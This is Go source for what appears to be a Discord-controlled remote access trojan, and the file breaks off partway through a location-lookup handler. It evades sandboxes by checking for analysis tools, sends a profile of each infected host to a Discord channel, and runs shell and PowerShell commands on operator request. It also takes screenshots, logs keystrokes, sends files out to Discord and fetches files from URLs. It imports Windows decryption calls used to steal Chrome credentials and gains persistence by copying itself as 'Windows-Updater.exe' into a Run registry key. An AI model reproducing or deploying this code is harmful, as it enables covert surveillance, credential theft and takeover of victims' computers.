package handlers

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/ShellCode33/VM-Detection/vmdetect"
	"github.com/TheTitanrain/w32"
	"github.com/bwmarrin/discordgo"
	"github.com/kbinani/screenshot"
	"github.com/reujab/wallpaper"
	"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/process"
	"golang.org/x/sys/windows"
	_ "modernc.org/sqlite"

	gohook "github.com/robotn/gohook"
)

var (
	MyChannelId             string
	crypt32                 = windows.NewLazyDLL("crypt32.dll")
	procCryptUnprotectData  = crypt32.NewProc("CryptUnprotectData")
	modPsapi                = windows.NewLazySystemDLL("Psapi.dll")
	procEnumProcessModules  = modPsapi.NewProc("EnumProcessModules")
	procGetModuleFileNameEx = modPsapi.NewProc("GetModuleFileNameExW")
	count                   = 0
	minClicks               = 0
	keyloggerRunning        = false
	keyLog                  = &strings.Builder{}
)

const (
	maxPath = 260
)

type LocationResponse struct {
	IP       string `json:"YourFuckingIPAddress"`
	Country  string `json:"YourFuckingCountry"`
	City     string `json:"YourFuckingCity"`
	Location string `json:"YourFuckingLocation"`
}

func RunSandboxEvasion() bool {
	// 1. Check Disk Size
	if !checkDiskSize() {
		fmt.Println("Disk size check failed.")
		return false
	}

	// 2. Track Clicks
	if !clickTracker() {
		fmt.Println("Click tracker check failed.")
		return false
	}

	// 3. Check Process Names
	if !checkAllProcessesNames() {
		fmt.Println("Process names check failed.")
		return false
	}

	// 4. Check DLL Names
	if !checkAllDLLNames() {
		fmt.Println("DLL names check failed.")
		return false
	}

	// If all checks pass, return true
	fmt.Println("All evasion checks passed.")
	return true
}

// Function to check disk size
func checkDiskSize() bool {
	minDiskSizeGB := 50.0

	// Get disk size using Windows syscall
	var freeBytesAvailable, totalBytes, totalFreeBytes uint64
	diskPath := syscall.StringToUTF16Ptr("C:\\") // Correctly define the disk path

	// Call GetDiskFreeSpaceEx and check for errors
	err := windows.GetDiskFreeSpaceEx(diskPath, &freeBytesAvailable, &totalBytes, &totalFreeBytes)
	if err != nil {
		fmt.Println("Error getting disk size:", err)
		return false
	}

	// Calculate the total disk size in GB
	diskSizeGB := float64(totalBytes) / (1024 * 1024 * 1024) // Convert bytes to GB

	// Check if the disk size is greater than the minimum required
	return diskSizeGB > minDiskSizeGB
}

// Function to track clicks
func clickTracker() bool {

	fmt.Println("Tracking clicks. Please click to continue...")

	// Use a loop to track mouse clicks
	for count < minClicks {
		time.Sleep(1 * time.Second)
		if isLeftMouseButtonClicked() {
			count++
		}
		if isRightMouseButtonClicked() {
			count++
		}
		fmt.Printf("Click count: %d\n", count)
	}

	return true
}

// Function to check left mouse button click
func isLeftMouseButtonClicked() bool {
	return (w32.GetAsyncKeyState(w32.VK_LBUTTON) & 0x8000) != 0
}

// Function to check right mouse button click
func isRightMouseButtonClicked() bool {
	return (w32.GetAsyncKeyState(w32.VK_RBUTTON) & 0x8000) != 0
}

// Function to check all processes names
func checkAllProcessesNames() bool {
	sandboxProcesses := []string{"vmsrvc", "tcpview", "wireshark", "visual basic", "fiddler", "vbox", "process explorer", "autoit"}
	processes, err := process.Processes()
	if err != nil {
		fmt.Println("Error getting processes:", err)
		return false
	}

	for _, proc := range processes {
		name, err := proc.Name()
		if err != nil {
			continue
		}
		for _, sandboxProcess := range sandboxProcesses {
			if sandboxProcess == name {
				fmt.Printf("Detected sandbox process: %s\n", name)
				return false
			}
		}
	}
	return true
}

// Function to check all loaded DLL names against a list of sandbox DLLs
func checkAllDLLNames() bool {
	sandboxDLLs := []string{"sbiedll.dll", "api_log.dll", "dir_watch.dll", "pstorec.dll", "vmcheck.dll", "wpespy.dll"}

	// Get a list of all processes
	processes, err := process.Processes()
	if err != nil {
		fmt.Println("Error getting processes:", err)
		return false
	}

	// Iterate over all processes
	for _, pid := range processes {
		var hProcess windows.Handle
		hProcess, err = windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, uint32(pid.Pid))
		if err != nil {
			continue // If unable to open the process, skip to the next
		}
		defer windows.CloseHandle(hProcess)

		var modules [1024]windows.Handle
		var bytesNeeded uint32

		// Get the loaded modules
		ret, _, _ := procEnumProcessModules.Call(uintptr(hProcess), uintptr(unsafe.Pointer(&modules[0])), uintptr(len(modules)*4), uintptr(unsafe.Pointer(&bytesNeeded)))
		if ret == 0 {
			continue // If the call failed, skip to the next
		}

		// Calculate the number of modules returned
		moduleCount := int(bytesNeeded / uint32(unsafe.Sizeof(modules[0])))

		// Check each loaded DLL against the sandbox DLLs
		for i := 0; i < moduleCount; i++ {
			var moduleFileName [maxPath]uint16
			ret, _, _ = procGetModuleFileNameEx.Call(uintptr(hProcess), uintptr(modules[i]), uintptr(unsafe.Pointer(&moduleFileName[0])), uintptr(maxPath))
			if ret == 0 {
				continue // If the call failed, skip to the next
			}
			dllPath := windows.UTF16ToString(moduleFileName[:])

			// Check against sandbox DLLs
			for _, sandboxDLL := range sandboxDLLs {
				if strings.Contains(strings.ToLower(dllPath), sandboxDLL) {
					fmt.Printf("Detected sandbox DLL: %s in process %d\n", dllPath, pid.Pid)
					return false // Return false if a sandbox DLL is found
				}
			}
		}
	}
	return true // Return true if no sandbox DLLs were found
}

// sendAndPinEmbedMessage creates and sends an embed message to the specified channel and pins it.
func SendAndPinEmbedMessage(dg *discordgo.Session, channelID, sessionId, hostname string) error {
	// Get current user and other information
	currentUser, _ := user.Current()
	cwd, _ := os.Getwd()
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	now := time.Now().Format("02/01/2006 15:04:05")

	// Create the embed message
	embed := &discordgo.MessageEmbed{
		Title:       fmt.Sprintf("Session *%s* opened! 🥳", sessionId),
		Description: fmt.Sprintf("**CWD**: %s", cwd),
		Color:       0x00FF00, // You can choose the color you want
		Fields: []*discordgo.MessageEmbedField{
			{Name: "**Time**", Value: now, Inline: true},
			{Name: "**IP**", Value: localAddr.IP.String(), Inline: true},
			{Name: "**Bits**", Value: getBits(), Inline: true},
			{Name: "**Hostname**", Value: hostname, Inline: true},
			{Name: "**OS**", Value: runtime.GOOS, Inline: true},
			{Name: "**Username**", Value: currentUser.Username, Inline: true},
			{Name: "**CPU**", Value: getCPU(), Inline: true},
			{Name: "**Is Admin**", Value: isAdmin(), Inline: true},
			{Name: "**Is VM**", Value: isVM(), Inline: true},
		},
	}

	buttons := discordgo.ActionsRow{
		Components: []discordgo.MessageComponent{
			discordgo.Button{
				Label:    "Processes",
				Style:    discordgo.SecondaryButton,
				CustomID: "process",
				Emoji: &discordgo.ComponentEmoji{
					Name: "📊",
				},
			},
			discordgo.Button{
				Label:    "Screenshot",
				Style:    discordgo.SecondaryButton,
				CustomID: "screenshot",
				Emoji: &discordgo.ComponentEmoji{
					Name: "📸",
				},
			},
			discordgo.Button{
				Label:    "Terminate",
				Style:    discordgo.SecondaryButton,
				CustomID: "terminate",
				Emoji: &discordgo.ComponentEmoji{
					Name: "❌",
				},
			},
			discordgo.Button{
				Label:    "Help",
				Style:    discordgo.SecondaryButton,
				CustomID: "help",
				Emoji: &discordgo.ComponentEmoji{
					Name: "❓",
				},
			},
			discordgo.Button{
				Label:    "Persistence",
				Style:    discordgo.SecondaryButton,
				CustomID: "persistence",
				Emoji: &discordgo.ComponentEmoji{
					Name: "🔁",
				},
			},
		},
	}

	buttons2 := discordgo.ActionsRow{
		Components: []discordgo.MessageComponent{
			discordgo.Button{
				Label:    "Location",
				Style:    discordgo.SecondaryButton,
				CustomID: "location",
				Emoji: &discordgo.ComponentEmoji{
					Name: "🌐",
				},
			},
			discordgo.Button{
				Label:    "Creds",
				Style:    discordgo.SecondaryButton,
				CustomID: "creds",
				Emoji: &discordgo.ComponentEmoji{
					Name: "🔑",
				},
			},
		},
	}

	// Send the embed message with buttons
	m, err := dg.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{
		Embed:      embed,
		Components: []discordgo.MessageComponent{buttons, buttons2},
	})
	if err != nil {
		return fmt.Errorf("error sending complex message: %w", err)
	}

	// Pin the message
	err = dg.ChannelMessagePin(channelID, m.ID)
	if err != nil {
		return fmt.Errorf("error pinning message: %w", err)
	}

	return nil
}

func getBits() string {
	if runtime.GOARCH == "amd64" {
		return "64-bit"
	}
	return "32-bit"
}

func getCPU() string {
	cpuInfo, err := cpu.Info()
	if err != nil {
		return "None" // Return "None" if an error occurs
	}

	// Assuming we want to return the first CPU's model name
	if len(cpuInfo) > 0 {
		return cpuInfo[0].ModelName // Return the model name of the first CPU
	}
	return "None"
}

func isAdmin() string {
	if runtime.GOOS == "windows" {
		// Windows specific check for admin rights
		var sid *windows.SID
		if err := windows.ConvertStringSidToSid(windows.StringToUTF16Ptr("S-1-5-32-544"), &sid); err != nil {
			return "No" // Unable to get SID, assume not admin
		}

		isAdmin := false
		var token windows.Token
		if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token); err == nil {
			defer token.Close()

			// Check if the user has admin privileges
			if isAdmin, err = token.IsMember(sid); err != nil {
				return "No" // Error checking membership
			}
		}

		if isAdmin {
			return "Yes" // User is an admin
		}
		return "No" // User is not an admin
	} else {
		// Linux and macOS specific check for admin rights
		if os.Geteuid() == 0 {
			return "Yes" // User is root
		}
		return "No" // User is not root
	}
}

func isVM() string {

	isInsideVM, _ := vmdetect.IsRunningInVirtualMachine()

	if isInsideVM {
		return "Yes"
	}
	return "No"
}

// getTmpDir returns the OS-specific temp directory
func getTmpDir() string {
	if runtime.GOOS == "windows" {
		return "C:\\Windows\\Tasks\\"
	}
	return "/tmp/"
}

// / helpCommand sends a help message in an embed format.
func helpCommand(s *discordgo.Session, channelID string) {
	commands := []struct {
		Command     string
		Description string
	}{
		// Slash commands
		{"/cmd <command>", "Run a system command."},
		{"/powershell <command>", "Run a PowerShell command."},
		{"/help", "Displays the help menu."},
		{"/download <file>", "Download a file from the server."},
		{"/screenshot", "Take a screenshot of all displays and send it to the channel."},
		{"/shutdown", "Shut down the bot."},
		{"/location", "Get your current IP location."},
		{"/cd <path>", "Change the working directory."},
		{"/ls [path]", "List the contents of a directory."},
		{"/process", "List all the processes running on the target machine."},
		{"/persistent", "Make the agent persistent on the target machine."},
		{"/creds", "Retrieve Chrome credentials on the target machine."},
		{"/upload <url> <path>", "Upload a file from a URL to a specified path."},
		{"/wallpaper <url>", "Change the wallpaper of the target machine."},
		{"/keylogger start", "Start a keylogger on the target machine."},
		{"/keylogger stop", "Stop the keylogger on the target machine."},
	}

	// Create an embed message
	embed := &discordgo.MessageEmbed{
		Title:       "✨ Help Menu ✨",
		Description: "Here are the available commands:",
		Color:       0x00ff00, // Set embed color (green)
	}

	// Build command list
	var commandList strings.Builder
	for _, cmd := range commands {
		commandList.WriteString(fmt.Sprintf("**%s** - %s\n", cmd.Command, cmd.Description))
	}

	// Add the commands to the embed
	embed.Fields = []*discordgo.MessageEmbedField{
		{
			Name:   "Available Commands",
			Value:  commandList.String(),
			Inline: false,
		},
	}

	// Send the embed message to the specified channel
	_, err := s.ChannelMessageSendEmbed(channelID, embed)
	if err != nil {
		fmt.Println("Error sending help embed:", err)
	}
}

// sendLongMessage handles messages that are too long to send in a single Discord message
func sendLongMessage(s *discordgo.Session, channelID string, out []byte, ref *discordgo.MessageReference) {
	if len(out) > 2000-13 { // Check if the message is too long
		tempFile, err := os.CreateTemp(getTmpDir(), "*.txt")
		if err != nil {
			fmt.Println("Error creating temp file:", err)
			return
		}
		defer tempFile.Close()

		tempFile.Write(out)
		fileName := tempFile.Name()

		f, err := os.Open(fileName)
		if err != nil {
			fmt.Println("Error opening temp file:", err)
			return
		}
		defer f.Close()

		fileStruct := &discordgo.File{Name: fileName, Reader: f}
		s.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{
			Files:     []*discordgo.File{fileStruct},
			Reference: ref,
		})
	} else {
		resp := fmt.Sprintf("```bash\n%s\n```", string(out))
		s.ChannelMessageSendReply(channelID, resp, ref)
	}
}

// handleScreenshot takes and sends a screenshot of all displays
func handleScreenshot(s *discordgo.Session, message interface{}) {
	n := screenshot.NumActiveDisplays()
	if n == 0 {
		if interaction, ok := message.(*discordgo.InteractionCreate); ok {
			fmt.Println("No active displays found.")
			s.InteractionRespond(interaction.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "No active displays found.",
				},
			})
		} else if message, ok := message.(*discordgo.MessageCreate); ok {
			fmt.Println("No active displays found.")
			s.ChannelMessageSend(message.ChannelID, "No active displays found.")
		}
		return
	}

	var filePaths []string // Collect file paths for sending later
	for idx := 0; idx < n; idx++ {
		bounds := screenshot.GetDisplayBounds(idx)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			fmt.Println("Error capturing screenshot:", err)
			continue
		}

		fileName := fmt.Sprintf("%s%d_%dx%d.png", getTmpDir(), idx, bounds.Dx(), bounds.Dy())
		file, err := os.Create(fileName)
		if err != nil {
			fmt.Println("Error creating screenshot file:", err)
			continue
		}
		defer file.Close()

		// Encode the image to the file
		if err := png.Encode(file, img); err != nil {
			fmt.Println("Error encoding image to file:", err)
			continue
		}

		// Store file path for later sending
		filePaths = append(filePaths, fileName)
	}

	// Send all captured screenshots
	for _, fileName := range filePaths {
		f, err := os.Open(fileName)
		if err != nil {
			fmt.Println("Error opening screenshot file:", err)
			continue
		}
		defer f.Close() // Ensure file is closed after sending

		fileStruct := &discordgo.File{Name: fileName, Reader: f}

		if interaction, ok := message.(*discordgo.InteractionCreate); ok {
			fmt.Printf("Sending screenshot for interaction: %s\n", fileName)
			_, err = s.ChannelMessageSendComplex(interaction.ChannelID, &discordgo.MessageSend{
				Files: []*discordgo.File{fileStruct},
			})
			if err != nil {
				fmt.Println("Error sending screenshot:", err)
			}
		} else if msg, ok := message.(*discordgo.MessageCreate); ok {
			fmt.Printf("Sending screenshot for message: %s\n", fileName)
			_, err = s.ChannelMessageSendComplex(msg.ChannelID, &discordgo.MessageSend{
				Files:     []*discordgo.File{fileStruct},
				Reference: msg.Reference(),
			})
			if err != nil {
				fmt.Println("Error sending screenshot:", err)
			}
		}
	}

	// Final response for slash commands
	if interaction, ok := message.(*discordgo.InteractionCreate); ok {
		fmt.Println("Responding to interaction after sending screenshots.")
		s.InteractionRespond(interaction.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Screenshots sent!",
			},
		})
	}

}

func handleKeyloggerCommand(s *discordgo.Session, i *discordgo.InteractionCreate) {
	options := i.ApplicationCommandData().Options

	if len(options) > 0 {
		switch options[0].Name {
		case "start":
			if keyloggerRunning {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "Keylogger is already running!",
					},
				})
				return
			}
			// Start the keylogger
			fmt.Println("Starting keylogger...")
			go startKeylogger()
			keyloggerRunning = true
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Keylogger started!",
				},
			})

		case "stop":
			if !keyloggerRunning {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "Keylogger is not running.",
					},
				})
				return
			}
			keyloggerRunning = false
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Keylogger stopped. Sending logs.",
				},
			})

			// Send the key log
			if keyLog.Len() > 0 {
				agentname, _ := os.Hostname()
				longMessage := fmt.Sprintf("**Keylogger Report | Agent: %s**\n```%s```", agentname, keyLog.String())
				s.ChannelMessageSend(i.ChannelID, longMessage) // Send as a normal message
				fmt.Println("Sending key log:", keyLog.String())
				keyLog.Reset() // Reset the key log after sending
				fmt.Println("Keylog is reset.")
			} else {
				s.ChannelMessageSend(i.ChannelID, "Keylog is empty.")
				fmt.Println("Keylog is empty.")
			}
			time.Sleep(1 * time.Second) // Wait for the message to be sent
		}
	} else {
		// No option provided
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Please provide an option: /start or /stop.",
			},
		})
	}
}

func startKeylogger() {
	// Start the keyhook
	envChan := gohook.Start()
	defer gohook.End()

	fmt.Println("Keylogger is active...")
	for ev := range envChan {
		if ev.Kind == gohook.KeyDown {
			// Log printable characters
			if ev.Keychar != 0 {
				keyLog.WriteRune(ev.Keychar)
				fmt.Printf("Captured: %v\n", string(ev.Keychar))
			} else {
				// Handle special keys using ev.Keycode
				switch ev.Keycode {
				case 27: // Escape key
					keyLog.WriteString("[ESC]")
				case 13: // Enter key
					keyLog.WriteString("\n")
				case 32: // Space key
					keyLog.WriteString(" ")
				case 8: // Backspace key
					keyLog.WriteString("[BACKSPACE]")
				case 9: // Tab key
					keyLog.WriteString("[TAB]")
				case 29: // Left Control
					keyLog.WriteString("[CTRL]")
				case 56: // Left Alt
					keyLog.WriteString("[ALT]")
				case 42: // Left Shift
					keyLog.WriteString("[SHIFT]")
				default:
					keyLog.WriteString(fmt.Sprintf("[%d]", ev.Keycode)) // Log the keycode for unhandled keys
				}
			}
		}

		// Stop the keylogger when it is not running
		if !keyloggerRunning {
			break
		}
	}
	fmt.Println("Keylogger stopped.")
}

// runCommand executes a shell command and sends the output to Discord, handling both message and slash commands.
func runCommand(s *discordgo.Session, message interface{}, command string) {
	var out []byte
	var err error

	// Determine if running on Windows or Unix-like system
	if runtime.GOOS == "windows" {
		cmd := exec.Command("C:\\Windows\\System32\\cmd.exe", "/C", command)
		out, err = cmd.CombinedOutput()
	} else {
		cmd := exec.Command("/bin/bash", "-c", command)
		out, err = cmd.CombinedOutput()
	}

	// Append error output if there is an error
	if err != nil {
		out = append(out, []byte("\n"+err.Error())...)
	}

	// Determine the type of message to respond to
	switch m := message.(type) {
	case *discordgo.MessageCreate:
		// For message commands (e.g., emoji commands)
		sendLongMessage(s, m.ChannelID, out, m.Reference())
	case *discordgo.InteractionCreate:
		// For slash commands
		if len(out) > 2000-13 {
			tempFile, err := os.CreateTemp("", "*.txt")
			if err != nil {
				fmt.Println("Error creating temp file:", err)
				return
			}
			defer os.Remove(tempFile.Name()) // Clean up the temp file afterwards

			// Write output to the temporary file
			if _, err := tempFile.Write(out); err != nil {
				fmt.Println("Error writing to temp file:", err)
				return
			}
			tempFile.Close() // Close the file to flush the buffer

			// Open the temporary file for reading
			f, err := os.Open(tempFile.Name())
			if err != nil {
				fmt.Println("Error opening temp file:", err)
				return
			}
			defer f.Close()

			// Prepare the file for Discord message
			fileStruct := &discordgo.File{Name: tempFile.Name(), Reader: f}

			// Send the message with the file attachment
			s.InteractionRespond(m.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Command output is too long, here is the output as a file:",
					Files:   []*discordgo.File{fileStruct},
				},
			})
		} else {
			// Respond to the interaction with the command output
			s.InteractionRespond(m.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: fmt.Sprintf("Command output:\n```bash\n%s\n```", string(out)),
				},
			})
		}
	default:
		// Unsupported message type
		fmt.Println("Unsupported message type")
	}
}

// RunPowershellcmd executes a PowerShell command and sends the output to Discord, handling both message and slash commands.
func runPowershellcmd(s *discordgo.Session, message interface{}, command string) {
	var out []byte
	var err error

	// Determine if running on Windows or Unix-like system
	if runtime.GOOS == "windows" {
		// cmd := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", command)
		cmd := exec.Command("powershell.exe", "-Command", command)
		out, err = cmd.CombinedOutput()
	} else {
		cmd := exec.Command("/bin/bash", "-c", command)
		out, err = cmd.CombinedOutput()
	}

	// Append error output if there is an error
	if err != nil {
		out = append(out, []byte("\n"+err.Error())...)
	}

	// Determine the type of message to respond to
	switch m := message.(type) {
	case *discordgo.MessageCreate:
		// For message commands (e.g., emoji commands)
		sendLongMessage(s, m.ChannelID, out, m.Reference())
	case *discordgo.InteractionCreate:
		// For slash commands
		if len(out) > 2000-13 {
			tempFile, err := os.CreateTemp("", "*.txt")
			if err != nil {
				fmt.Println("Error creating temp file:", err)
				return
			}
			defer os.Remove(tempFile.Name()) // Clean up the temp file afterwards

			// Write output to the temporary file
			if _, err := tempFile.Write(out); err != nil {
				fmt.Println("Error writing to temp file:", err)
				return
			}
			tempFile.Close() // Close the file to flush the buffer

			// Open the temporary file for reading
			f, err := os.Open(tempFile.Name())
			if err != nil {
				fmt.Println("Error opening temp file:", err)
				return
			}
			defer f.Close()

			// Prepare the file for Discord message
			fileStruct := &discordgo.File{Name: tempFile.Name(), Reader: f}

			// Send the message with the file attachment
			s.InteractionRespond(m.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Command output is too long, here is the output as a file:",
					Files:   []*discordgo.File{fileStruct},
				},
			})
		} else {
			// Respond to the interaction with the command output
			s.InteractionRespond(m.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: fmt.Sprintf("Command output:\n```bash\n%s\n```", string(out)),
				},
			})
		}
	default:
		// Unsupported message type
		fmt.Println("Unsupported message type")
	}
}

// Function to list all running processes on the system
func handleListProcesses(s *discordgo.Session, i *discordgo.InteractionCreate) {
	// Function to list all running processes on the system
	listProcesses := func() (string, error) {
		var cmd *exec.Cmd

		// Check the OS type and set the appropriate command to list processes
		if runtime.GOOS == "windows" {
			// Use tasklist for Windows
			cmd = exec.Command("tasklist")
		} else {
			// Use ps on Unix-based systems (Linux, macOS, etc.)
			cmd = exec.Command("ps", "aux")
		}

		// Run the command and capture the output
		output, err := cmd.CombinedOutput()
		if err != nil {
			return "", err
		}

		// Return the output wrapped in a bash-styled code block
		return fmt.Sprintf("```bash\n%s\n```", string(output)), nil
	}

	// Call the listProcesses function to get the process list
	processList, err := listProcesses()
	if err != nil {
		processList = fmt.Sprintf("Error listing processes: %v", err)
	}

	// Convert the process list to a byte array for handling long messages
	out := []byte(processList)

	// Check if the interaction has an associated message reference
	var messageRef *discordgo.MessageReference
	if i.Interaction.Message != nil {
		messageRef = i.Interaction.Message.Reference()
	}
	// Send the process list, handling long outputs
	sendLongMessage(s, i.ChannelID, out, messageRef)
}

// Function to enable persistence
func handlePersistence(s *discordgo.Session, i *discordgo.InteractionCreate) {
	// Define the backdoor location (in AppData folder)
	appData := os.Getenv("APPDATA")
	if appData == "" {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Error: APPDATA environment variable not found.",
			},
		})
		return
	}

	backdoorLocation := appData + "\\Windows-Updater.exe"

	// Check if the backdoor file already exists
	if _, err := os.Stat(backdoorLocation); !os.IsNotExist(err) {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Persistence already enabled.",
			},
		})
		return
	}

	// Copy the current executable to the backdoor location
	currentExecutable, err := os.Executable()
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: fmt.Sprintf("Error getting current executable path: %v", err),
			},
		})
		return
	}

	err = copyFile(currentExecutable, backdoorLocation)
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: fmt.Sprintf("Error copying file to AppData: %v", err),
			},
		})
		return
	}

	// Add the backdoor to the Windows startup via registry
	cmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "update", "/t", "REG_SZ", "/d", backdoorLocation, "/f")
	err = cmd.Run()
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: fmt.Sprintf("Error adding to registry: %v", err),
			},
		})
		return
	}

	// If everything is successful
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "Persistence enabled successfully.",
		},
	})
}

// Helper function to copy files
func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destinationFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destinationFile.Close()

	_, err = io.Copy(destinationFile, sourceFile)
	return err
}

// handleFileDownload uploads a file from the system to Discord if it's under 8MB
func handleFileDownload(s *discordgo.Session, message interface{}) {
	var fileName string
	var interaction *discordgo.InteractionCreate
	var msg *discordgo.MessageCreate

	// Determine the type of message (either interaction or message)
	switch m := message.(type) {
	case *discordgo.MessageCreate:
		// It's a message command
		msg = m
		fileName = m.Content[5:] // Assuming command is "/download "
	case *discordgo.InteractionCreate:
		// It's a slash command
		interaction = m
		fileName = m.ApplicationCommandData().Options[0].StringValue()
	default:
		// Unsupported message type
		return
	}

	// Open the file
	f, err := os.Open(fileName)
	if err != nil {
		if interaction != nil {
			// Respond to the interaction
			s.InteractionRespond(interaction.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Error opening file: " + err.Error(),
				},
			})
		} else {
			// Respond to the message
			s.ChannelMessageSendReply(msg.ChannelID, "Error opening file: "+err.Error(), msg.Reference())
		}
		return
	}
	defer f.Close()

	fi, err := f.Stat()
	if err != nil {
		if interaction != nil {
			s.InteractionRespond(interaction.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Error getting file info: " + err.Error(),
				},
			})
		} else {
			s.ChannelMessageSendReply(msg.ChannelID, "Error getting file info: "+err.Error(), msg.Reference())
		}
		return
	}

	if fi.Size() < 8388608 { // Less than 8MB
		fileStruct := &discordgo.File{Name: fileName, Reader: f}
		if interaction != nil {
			// Send file with interaction response
			s.InteractionRespond(interaction.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Uploading file...",
					Files:   []*discordgo.File{fileStruct},
				},
			})
		} else {
			// Send file with message response
			s.ChannelMessageSendComplex(msg.ChannelID, &discordgo.MessageSend{
				Files:     []*discordgo.File{fileStruct},
				Reference: msg.Reference(),
			})
		}
	} else {
		if interaction != nil {
			// Respond to interaction if file is too large
			s.InteractionRespond(interaction.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "File is larger than 8MB 😔",
				},
			})
		} else {
			// Respond to message if file is too large
			s.ChannelMessageSendReply(msg.ChannelID, "File is larger than 8MB 😔", msg.Reference())
		}
	}
}

// handleFileUpload downloads the attached file from Discord to the system
func handleFileUpload(s *discordgo.Session, m *discordgo.MessageCreate) {
	path := m.Content[7:]
	if len(m.Attachments) > 0 {
		out, err := os.Create(path)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error creating file: "+err.Error(), m.Reference())
			return
		}
		defer out.Close()

		resp, err := http.Get(m.Attachments[0].URL)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error downloading file: "+err.Error(), m.Reference())
			return
		}
		defer resp.Body.Close()

		io.Copy(out, resp.Body)
		s.ChannelMessageSendReply(m.ChannelID, "Uploaded file to "+path, m.Reference())
	}
}

// handleLocation fetches the location data and responds to the Discord interaction.
func handleLocation(s *discordgo.Session, i *discordgo.InteractionCreate) {
	// Fetch location data from the API
	response, err := http.Get("https://json.ipv4.myip.wtf")
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Error fetching location data.",
			},
		})
		return
	}
	defer response.Body.Close()

	if response.StatusCode != http.StatusOK {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Failed to fetch location data.",
			},
		})
		return
	}

	var locationData LocationResponse
	if err := json.NewDecoder(response.Body).Decode(&locationData); err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Error decoding location data.",
			},
		})
		return
	}

	// Prepare the response message
	responseMessage := fmt.Sprintf("Your IP: %s\nCountry: %s\nCity: %s\nLocation: %s",
		locationData.IP, locationData.Country, locationData.City, locationData.Location)

	// Respond to the interaction
